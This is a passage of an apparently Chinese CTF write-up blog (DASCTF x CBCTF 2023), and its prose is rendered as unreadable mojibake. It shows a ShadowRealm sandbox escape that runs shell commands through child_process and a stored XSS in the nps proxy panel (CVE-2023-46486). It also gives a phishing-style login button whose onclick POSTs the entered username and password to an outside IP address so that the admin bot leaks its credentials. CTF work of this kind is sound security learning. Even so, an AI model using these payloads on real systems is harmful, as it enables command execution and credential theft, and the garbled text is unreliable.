href="#content-length%E9%99%90%E5%88%B6">Content-Lengthé™åˆ¶</a></li><li><a href="#chuncked%E7%BC%96%E7%A0%81%E6%80%8E%E4%B9%88%E5%8F%91">chunckedç¼–ç æ€ä¹ˆå‘</a></li><li><a href="#%E4%B8%8D%E7%A8%B3%E5%AE%9Ajackson%E9%93%BE%E9%97%AE%E9%A2%98">ä¸ç¨³å®šjacksoné“¾é—®é¢˜</a><ul><li><a href="#%E6%B5%81%E7%A8%8B">æµç¨‹</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%A1%BA%E5%BA%8F%E4%B8%8D%E4%B8%80%E5%AE%9A">ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®š</a></li><li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">è§£å†³æ–¹æ³•ğŸ˜Š</a><ul><li><a href="#%E5%AE%9E%E7%8E%B0">å®ç°</a></li></ul></li><li><a href="#%E6%9E%84%E9%80%A0">æ„é€ </a></li></ul></li><li><a href="#%E5%86%85%E5%AD%98%E7%9A%84%E4%BD%BF%E7%94%A8">å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´</a><ul><li><a href="#%E5%88%97%E7%9B%AE%E5%BD%95">åˆ—ç›®å½•</a></li><li><a href="#%E8%AF%BB%E6%96%87%E4%BB%B6">è¯»æ–‡ä»¶</a></li></ul></li><li><a href="#rasp">RASPğŸ˜…ğŸ˜¡</a><ul><li><a href="#%E5%95%A5%E4%BA%8Brasp">å•¥äº‹RASP</a></li></ul></li><li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">è§£å†³æ–¹æ¡ˆğŸ˜’</a><ul><li><a href="#jni%E8%A7%84%E8%8C%83">JNIè§„èŒƒ</a></li></ul></li></ul></li></ul><!-- tocstop --><h1 id="das0raysxcbctf"><span id="das0raysxcbctf"> DAS0RAYSxCBCTF</span></h1><h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1><p>wcsnmd,è°ç»™ğŸ‘´å‡ºçš„è¿™ä¹ˆæ¶å¿ƒçš„web,nmdçˆ†é›¶äº†,tmdæ€»å…±3100çš„è§£,ä»€ä¹ˆâˆšâ‘§ç©æ„å„¿.</p><p>wp:<a href="https://test-cuycc6s9lprw.feishu.cn/docx/T7budbiSWoTNd4xQGVicHL1Vnpf">â€Œâ€ï»¿â¡ï»¿â£â€Œâ€ï»¿â€â£â¢â¢ï»¿â€Œâ€â€¬ï»¿â£ï»¿â€Œâ£â¢â€Œâ¡â¤â¢â¤â¤â€Œâ€Œâ¡â¢â€Œâ€ï»¿â£â€Œâ€Œâ¡â£ï»¿ï»¿DASCTF x CBCTF - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn)</a></p><p><a href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p><h1 id="yet-another-box"><span id="yet-another-box"> yet another box</span></h1><p>è¿™é¢˜æ˜¯ä¸€ä¸ªæ¯”è¾ƒæ–°çš„æ²™ç®±<code>shadowrealm</code>,è¿™bydå’Œnodeçš„vm8å¤ªä¸€æ ·,æœ‰ç€è‡ªå·±çš„å…¨å±€å¯¹è±¡å’Œå†…ç½®å‡½æ•°,å°±æŒºæŠ½è±¡,æ²¡æ³•åƒ<code>vm</code>,ä¹Ÿæ— æ³•é€šè¿‡<code>prototype pollution</code>æ§åˆ¶ä¸»æ¨¡å—ä¸­çš„å†…ç½®å±æ€§å¦å¤–ç”±äºä¸ package.json å£°æ˜äº† â€œtypeâ€:â€œmoduleâ€ ä¸”æ–‡ä»¶ç»“å°¾ä¸º .mjsï¼Œæ‰€é‡‡ç”¨çš„ESM é»˜è®¤strict modeï¼Œæ— æ³•é€šè¿‡ [stack-trace-api](<a href="https://v8.dev/docs/stack-trace-api#customizing-stack-traces">Stack trace API Â· V8 â€” å †æ ˆè·Ÿè¸ª API Â·V8å‘åŠ¨æœº</a>) è·¨ä¸Šä¸‹æ–‡å–å¾—å¯åˆ©ç”¨å¯¹è±¡ã€‚</p><h2 id="stack-trace-api"><span id="stack-trace-api"> Stack trace API</span></h2><p>ä»…ä½œä¸ºå­¦ä¹ è®°å½•ä½¿ç”¨,å¹¶ä¸ä¸ºæœ¬é¢˜æä¾›æ€è·¯.</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒV8 æŠ›å‡ºçš„å‡ ä¹æ‰€æœ‰é”™è¯¯éƒ½æœ‰ä¸€ä¸ªå±æ€§,æŠ›å‡ºé”™è¯¯çš„æ—¶å€™ä¼šç”¨åˆ°æ–¹æ³•,è¯¥æ–¹æ³•èƒ½è·å¾—åˆ°å¤–é¢çš„å…¨å±€å¯¹è±¡.</p><h2 id="shadow-realm-api"><span id="shadow-realm-api"> Shadow-Realm-API</span></h2><p><code>Wrapped Function Exotic Objects</code>æ˜¯ä¸€ç§å¥‡å¼‚å¯¹è±¡,å†…å«ä¸€ä¸ªå›è°ƒå‡½æ•°.å…·æœ‰ä¸€äº›å†…ç½®æ§½<code>slot</code>,:</p><table><thead><tr><th style="text-align:center">Internal slots</th><th style="text-align:center">Type</th><th style="text-align:center"><strong>Description</strong></th></tr></thead><tbody><tr><td style="text-align:center">[[WrappedTargetFunction]]</td><td style="text-align:center">Callable Object</td><td style="text-align:center">Stores the callable object.</td></tr><tr><td style="text-align:center">[[Call]]</td><td style="text-align:center">The [[Call]] internal method</td><td style="text-align:center">Executes code associated with this objectâ€™s [[WrappedTargetFunction]].</td></tr><tr><td style="text-align:center">[[Realm]]</td><td style="text-align:center"><a href="https://tc39.es/ecma262/#realm-record"> Realm Record</a></td><td style="text-align:center">The <a href="https://tc39.es/ecma262/#realm">realm</a> in which the function was created.</td></tr></tbody></table><p>è¿˜æœ‰[[Prototype]] and [[Extensible]]</p><p>å¯¹è±¡çš„[[call]]æ–¹æ³•è·å–ä¸¤ä¸ªå‚æ•°:thisArgument, argumentsList .è°ƒç”¨æ—¶ä¼šå®ç°ä»¥ä¸‹æ­¥éª¤:</p><p>1.è®¾ç½®è¿è¡Œä»£ç çš„ä¸Šä¸‹æ–‡.æ‰§è¡Œä¸Šä¸‹æ–‡é€šå¸¸åŒ…æ‹¬æ‰§è¡Œå‡½æ•°çš„ä½œç”¨åŸŸã€å˜é‡ã€this å€¼ç­‰ä¿¡æ¯ã€‚</p><p>2.è®¾ç½®æ–°çš„ä½œç”¨åŸŸcalleecontext.</p><p>3.æ‰§è¡Œassertæ–­è¨€,ç¡®ä¿calleecontextæ˜¯ç›®å‰æ­£åœ¨æ‰§è¡Œçš„ä¸Šä¸‹æ–‡.</p><p>4.ç”¨resultå‚¨å­˜**OrdinaryWrappedFunctionCall(F, thisArgument, argumentsList)**çš„è¿è¡Œç»“æœ</p><p>5.calleeContext è¢«ä»æ‰§è¡Œä¸Šä¸‹æ–‡æ ˆä¸­ç§»é™¤ï¼Œè€Œ callerContext è¢«æ¢å¤ä¸ºå½“å‰è¿è¡Œçš„æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚</p><p>6.åˆ¤æ–­è¿”å›ç±»å‹,å¦‚æœ[[TYPE]]å·²è¿”å›,åˆ™è¿”å›value.</p><p>7.å¤„ç†å¼‚å¸¸</p><p>8.æ‰§è¡Œç»“æŸ.</p><h2 id="dynamic-importæ–¹æ¡ˆ"><span id="dynamic-importæ–¹æ¡ˆ"> dynamic importæ–¹æ¡ˆ</span></h2><p>é€šè¿‡åŠ¨æ€ import å…è®¸æˆ‘ä»¬æŒ‰éœ€åŠ è½½ JavaScript æ¨¡å—ï¼Œè€Œä¸ä¼šåœ¨æœ€å¼€å§‹çš„æ—¶å€™å°±å°†å…¨éƒ¨æ¨¡å—åŠ è½½ã€‚</p><p>åŠ¨æ€ import è¿”å›äº†ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè¿™ä¹Ÿæ„å‘³ç€å¯ä»¥åœ¨ then ä¸­ç­‰æ¨¡å—åŠ è½½æˆåŠŸåå»åšä¸€äº›æ“ä½œã€‚</p><p>æ‰€ä»¥importå¯¼å…¥éœ€è¦é€šè¿‡thenå»è§¦å‘å…¶æ–¹æ³•.</p><p>importåœ¨æ‰§è¡Œæ–¹æ³•åä»ç„¶æ˜¯promiseå¯¹è±¡,é‡‡ç”¨çš„ç±»ä¼¼äºé“¾å¼è°ƒç”¨.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var test = <span class="keyword">import</span>(<span class="string">&quot;child_process&quot;</span>).then(m=&gt;console.log(m))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶ä¸­testè·å–promiseå¼‚æ­¥å¯¹è±¡,è€Œmç›´æ¥å°±è·å¾—child_processå¯¹è±¡.</p><h2 id="exp"><span id="exp"> exp</span></h2><p>ç®€è€Œè¨€ä¹‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts</span><br></pre></td></tr></table></figure><p>æ”¯æŒdynamic import</p><p>â€œDynamic importâ€ æ˜¯æŒ‡åœ¨ JavaScript ä¸­åŠ¨æ€åŠ è½½æ¨¡å—æˆ–æ–‡ä»¶çš„èƒ½åŠ›ã€‚è¿™æ˜¯ ECMAScript 2020 æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œå¼•å…¥äº† import() å‡½æ•°ï¼Œå®ƒå¯ä»¥åœ¨è¿è¡Œæ—¶å¼‚æ­¥åŠ è½½æ¨¡å—ã€‚è¿™ä¸ä¼ ç»Ÿçš„é™æ€ import è¯­å¥ä¸åŒï¼Œåè€…åœ¨ä»£ç åŠ è½½æ—¶å³ç¡®å®šäº†è¦å¯¼å…¥çš„æ¨¡å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">&#x27;child_process&#x27;</span>).then(m=&gt;m.execSync(<span class="string">&#x27;/readflag &gt; /app/asserts/flag&#x27;</span>));</span><br><span class="line"><span class="number">1</span>;</span><br></pre></td></tr></table></figure><h1 id="nps"><span id="nps"> nps</span></h1><p>mdåˆæ˜¯xss,ğŸ‘´åˆtnndä¸ä¼š,ã—ã­ï¼</p><p>ğŸ§€ä¸€ä¸ªnpsç½‘ç«™ä¸Šçš„xss.æ¶‰åŠ<a href="https://blog.carrot2.cn/2023/10/nps2.html">CVE-2023-46486</a></p><p><a href="https://github.com/ehang-io/nps/releases/tag/v0.26.10">é¡¹ç›®åœ°å€</a></p><p>å½±å“èŒƒå›´:</p><p>nps&lt;=V0.26.10</p><p>ä½ tmæè¿™æ”¾å±å‘¢,æœ€æ–°ç‰ˆæœ¬å°±æ˜¯è¿™ä¸ª,21å¹´æœ€åpublishäº†.</p><p>æ¼æ´æ€ä¹ˆä¸ªäº‹:</p><p><code>bootstrapTable</code>å¹¶æœªé…ç½®<code>escape</code>å­—æ®µ,ä¸”ä½¿ç”¨æ—¶ä¸æ”¹é»˜è®¤é…ç½®</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101223246.png" alt="å¾®ä¿¡æˆªå›¾_20231101223246"></p><p>kokodayo,web/views/client/list.html</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101223529.png" alt="å¾®ä¿¡æˆªå›¾_20231101223529"></p><p>è¿™é‡Œè®¾ç½®å…¬é’¥,é˜²æ­¢è¢«ntr(è¢«åˆ«äººç”¨ä»£ç†),ä½ ä¹Ÿä¸å¸Œæœ›ä½ æ‹¿ä¸åˆ°shellå§(bushi)</p><p>åŒä¸ºä»£ç†,ç»å¸¸è¢«æèµ·çš„frpå’Œvenoméƒ½æ²¡å¤ªæ³¨æ„å…¬é’¥,å®é™…ä¸Šæ˜¯æœ‰å…¬é’¥è¿™ä¸€é€‰é¡¹çš„.</p><p>è¿™é‡Œ,æˆ‘ä»¬å®Œå…¨å°±èƒ½å¤Ÿé€šè¿‡å®¢æˆ·ç«¯å»è¿›è¡Œæ”»å‡»äº†.</p><h2 id="å¼€æ‰“"><span id="å¼€æ‰“"> å¼€æ‰“ğŸ˜“</span></h2><p>cnm,sbwindows,æ­»æ´»ç”¨ä¸æˆ,linuxä¸€ä¸‹å°±å‡ºæ¥äº†å’ŒğŸ‘´ğŸ˜¡äº†</p><p>âˆšâ‘§ç©æ„,å½“ğŸ‘´â­ğŸ˜¡å§</p><p>é¦–å…ˆä¸‹è½½å®¢æˆ·ç«¯,è¿™ä¸€ç‚¹å’Œfrpçš„adminç«¯å’Œagentç«¯ç±»ä¼¼</p><p>ç„¶åé…ç½®å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8024</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101224733.png" alt="å¾®ä¿¡æˆªå›¾_20231101224733"></p><p>Ã—æˆåŠŸäº†,ç‹ ç‹ åœ°Ã—è¿›å»</p><h2 id="remoteå¹²"><span id="remoteå¹²"> remoteå¹²ğŸ¤ª</span></h2><h3 id="å¿†æ‚Ÿè¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ "><span id="å¿†æ‚Ÿè¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ "> å¿†!æ‚Ÿ!è¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ </span></h3><p>é¦–å…ˆé¢˜ç›®é€šè¿‡jsä»£ç é€ äº†ä¸ªåå°æœºå™¨äºº,ğŸ‘´å¾ˆå–œæ¬¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;chromium, errors&#125; <span class="keyword">from</span> <span class="string">&quot;playwright-chromium&quot;</span>;</span><br><span class="line"></span><br><span class="line">const PASSWORD = <span class="string">&quot;DASCTF_flag&quot;</span>;</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">async</span> function visit() &#123;</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://a.o.com:8080/client/list&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;catch (e) &#123;</span><br><span class="line">                    console.log(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) &#123;</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError)&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const browser = <span class="keyword">await</span> chromium.launch(&#123;</span><br><span class="line">        headless: true</span><br><span class="line">    &#125;);</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹ä¸æ‡‚æ²¡å…³ç³»,ğŸ‘´æ¥å¸¦ä½ åˆ†æä¸€ä¸‹.</p><p>é¦–å…ˆæ•´ä¸ªå°±æ˜¯ä¸€å¨shitâ›°,</p><p>é€šè¿‡ä¸€ä¸ªç®­å¤´å‡½æ•°()çš„æ–¹å¼ç«‹å³è°ƒç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const browser = <span class="keyword">await</span> chromium.launch(&#123;</span><br><span class="line">        headless: true</span><br><span class="line">    &#125;);</span><br><span class="line">    const context = <span class="keyword">await</span> browser.newContext();</span><br><span class="line">    context.setDefaultTimeout(<span class="number">10000</span>);</span><br><span class="line">    setInterval(visit, <span class="number">30000</span>);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæµè§ˆå™¨å’Œä¸Šä¸‹æ–‡,ç„¶åè®¾ç½®setIneterval,è¡¨ç¤ºæ¯ä¸‰åç§’è°ƒç”¨visit,å‡½æ•°,è®©ğŸ‘´çœ‹çœ‹visitå‡½æ•°æ€ä¹ˆä¸ªäº‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">async</span> function visit() &#123;</span><br><span class="line">        const page = <span class="keyword">await</span> context.newPage();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">await</span> page.goto(<span class="string">&#x27;http://a.o.com:8080/client/list&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;catch (e) &#123;</span><br><span class="line">                    console.log(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) &#123;</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError)&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè·å–æ–°é¡µé¢,ç„¶åè®¿é—®ä¸‰æ¬¡<code>http://a.o.com:8080/client/list</code></p><p>ä½ çœ‹çœ‹çœ¼ç†Ÿä¸,/client/liståˆšå¥½å°±æ˜¯åˆšæ‰å±•ç¤ºxssçš„è·¯å¾„,ä½ å“,ä½ ç»†å“.è¿™ä¸ªhostçœ¼ç†Ÿä¸,è¿™å¯æ˜¯åœ¨dockeré‡Œé¢è®¾ç½®çš„åœ°å€æ˜ å°„å•Š.</p><p>ãªã‚‰ã°ã€€ç­”ãˆã¯ã²ã¨ã¤ã </p><p>å°±æ˜¯xss,æ¥ä¸‹æ¥å°±æ˜¯åˆ†æè¿™ä¸ªæœºå™¨äººäº‹æ€ä¹ˆæ“ä½œçš„äº†.</p><p>é¦–å…ˆè¦çœ‹æœ‰æ— <code>button[langtag=&quot;word-login&quot;]</code>è¿™ç©æ„</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦è®¾ç½®ä¸€ä¸ªbuttonäº†,ä¸è¿‡æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œé¢ä¸‹ç‚¹æ¯’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot;</span> langtang=&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>$(â€˜#usernameâ€™) æ˜¯ä¸€ä¸ª jQuery é€‰æ‹©å™¨ï¼Œç”¨äºé€‰æ‹©å…·æœ‰æŒ‡å®š id å±æ€§çš„ HTML å…ƒç´ ã€‚åœ¨è¿™ä¸ªé€‰æ‹©å™¨ä¸­ï¼Œ#username è¡¨ç¤ºè¦é€‰æ‹© id ä¸º â€œusernameâ€ çš„å…ƒç´ ã€‚ä¼šä»è¾“å…¥è·å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;flag&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å†æ ¹æ®è¿™ä¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br></pre></td></tr></table></figure><p>è®©æœºå™¨äººå»è¾“å…¥æˆ‘ä»¬è®¾ç½®å¥½çš„ç™»å½•æ¡†,ä»è€Œé€šè¿‡inputè·å–åˆ°flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">&quot;username&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-username&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-password&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤,åœˆå¥—å·²è®¾,åªç­‰æ•Œå†›è¿›å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form <span class="keyword">class</span>=<span class="string">&quot;m-t&quot;</span> onsubmit=<span class="string">&quot;return false&quot;</span>&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">&quot;username&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-username&quot;</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-password&quot;</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;button onclick=<span class="string">&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot;</span> langtag=<span class="string">&quot;word-login&quot;</span>&gt;Login&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¹ˆå¤æ‚æ•°æ®ä¼ è¾“èµ·æ¥ä¸æ–¹ä¾¿,ğŸ‘´ä¸å–œæ¬¢,æ¢ä¸€ä¸ª</p><h3 id="exp"><span id="exp"> exp</span></h3><p>unicodeå°±è¡Œ,è€Œä¸”æ§åˆ¶å°å¤§å¤§æ”¯æŒunicode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=node4.buuoj.cn:<span class="number">26658</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span 